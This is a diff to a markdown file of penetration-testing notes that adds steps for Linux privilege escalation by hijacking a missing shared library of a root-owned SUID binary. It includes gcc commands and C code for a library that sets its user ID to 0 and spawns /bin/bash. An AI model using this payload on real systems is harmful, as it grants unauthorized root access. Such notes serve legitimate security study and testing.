@@ -34,7 +34,12 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. **LD PreLoad Stuff - Use 'ldd' command to see the dependent .so files** --> https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
 
 
-#### PrivESC Methodology for Linux - ldd hijacking (if a binary has .so missing)
+#### PrivESC Methodology for Linux - Dynamic Library Hijacking (if a binary has .so missing)
+> 1. Identify a binary (probably SUID) is set and group/owner is root:root
+> 1. ldd /usr/bin/custombinary (to see the dependent .so files). Lets assume our file is **libfowzmalbec.so**
+> 1. First identify the location to place the .so file (writeable directory), for this read the **.conf** files inside the **/etc/ld.so.conf.d/**
+> 1. is **ldconfig** is loading itself via **cronjob** or allowed to configured **manually** 
+> 1. use **strings** against the binary to check the name of **custom function**, lets assume it shows us **fowzmalbec**
 > 1. gcc rootshell.c -o vulnlib.so -shared -Wall -fPIC -w
 > 1. gcc rootshell.c -o custom_function_name.so -shared -Wall -fPIC -w
 ```c
@@ -51,7 +56,7 @@ or
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
-void custom_function_name() 
+void fowzmalbec() 
 {
 setuid(0); setgid(0); system("/bin/bash");
 }
